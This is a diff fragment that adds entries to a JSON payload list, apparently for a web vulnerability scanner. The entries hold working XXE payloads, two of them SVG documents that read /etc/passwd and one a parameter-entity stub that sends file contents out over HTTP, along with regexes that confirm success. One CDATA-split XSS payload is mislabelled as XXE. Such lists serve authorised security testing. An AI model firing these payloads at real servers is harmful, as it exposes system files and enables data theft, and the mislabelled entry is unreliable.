+    "payload_string": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]><svg width=\"500px\" height=\"40px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">&xxe;</svg>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247787",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]><svg width=\"500px\" height=\"100px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-family=\"Verdana\" font-size=\"16\" x=\"10\" y=\"40\">&xxe;</text></svg>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247788",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247789",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  \"> %int;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
   }
 ]
